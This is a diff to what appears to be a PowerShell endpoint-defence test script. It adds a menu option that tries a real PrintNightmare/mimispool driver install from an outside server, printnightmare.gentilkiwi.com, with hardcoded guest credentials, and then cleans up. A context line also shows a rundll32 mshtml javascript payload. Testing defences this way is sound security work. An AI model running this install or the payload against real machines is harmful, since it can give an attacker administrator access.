@@ -138,6 +138,10 @@ function displaymenu($mitems) {
         Number = 29;
         Test = "Block RUNDLL32 process launch"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 30;
+        Test = "PrintNightmare/Mimispool"
+    }
     return $mitems
 }
 
@@ -966,6 +970,78 @@ javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WS
     pause
 }
 
+function mimispool () {
+    # Reference - https://github.com/gentilkiwi/mimikatz/tree/master/mimispool#readme
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 30. PrintNightmare / Mimispool ---"
+
+    $install = $true
+    $serverName  = 'printnightmare.gentilkiwi.com'
+    $username    = 'gentilguest'
+    $password    = 'password'
+    $printerName = 'Kiwi Legit Printer'
+    $system32        = $env:systemroot + '\system32'
+    $drivers         = $system32 + '\spool\drivers'
+
+    $fullprinterName = '\\' + $serverName + '\' + $printerName
+    $credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))
+    write-host -foregroundcolor $warningmessagecolor "*** WARNING - This process will install a test printer driver and associated files"
+    write-host -foregroundcolor $processmessagecolor "Removing existing test printer if present"
+    Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
+    Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+    write-host -foregroundcolor $processmessagecolor "Creating new",$printerName
+    New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
+    try {
+        Add-Printer -ConnectionName $fullprinterName -ErrorAction stop
+    } 
+    catch {
+        write-host -foregroundcolor $processmessagecolor "Unable to install printer - test SUCCESSFUL"
+        $install=$false
+        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
+    }
+    write-host -foregroundcolor $warningmessagecolor "`nIf an administrator command prompt appears, then the test has FAILED`n"
+    pause
+
+    if ($install) {
+        write-host -foregroundcolor $errormessagecolor "`nAble in install printer - test FAILED"
+        $driver = (Get-Printer -Name $fullprinterName).DriverName
+        write-host -foregroundcolor $processmessagecolor "Remove printer",$printerName
+        Remove-Printer -Name $fullprinterName
+        start-sleep -Seconds 3
+        write-host -foregroundcolor $processmessagecolor "Remove printer driver",$driver
+        Remove-PrinterDriver -Name $driver
+        write-host -foregroundcolor $processmessagecolor "Remove mapping`n"
+        Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
+        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+        If ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            write-host -foregroundcolor $processmessagecolor "Running as an Administrator detected`n"
+            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\x64\3\mimispool.dll')
+                Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
+            }
+            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($drivers  + '\W32X86\3\mimispool.dll')
+                Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
+            }
+            if (test-path($system32 + '\mimispool.dll')) {
+                write-host -foregroundcolor $processmessagecolor "Deleting ",($system32 + '\mimispool.dll')
+                Remove-Item -Force -Path ($system32 + '\mimispool.dll')
+            }
+        }
+        else {
+            write-host -foregroundcolor $warningmessagecolor "Not Running as an Administrator. Manual clean up required`n"
+            if (test-path($drivers  + '\x64\3\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\x64\3\mimispool.dll')"Should be removed by an administrator"
+            }
+            if (test-path($drivers  + '\W32X86\3\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($drivers  + '\W32X86\3\mimispool.dll')"Should be removed by an administrator"
+            }
+            if (test-path($system32 + '\mimispool.dll')) {
+                write-host -foregroundcolor $errormessagecolor "***",($system32 + '\mimispool.dll')"Should be removed by an administrator"
+            }
+        }
+    }
+}
+
 <#          Main                #>
 Clear-Host
 if ($debug) {       # If -debug command line option specified record log file in parent
@@ -1032,6 +1108,7 @@ switch ($results.number) {
     27  {certutil}
     28  {wmic}
     29  {rundll}
+    30  {mimispool}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
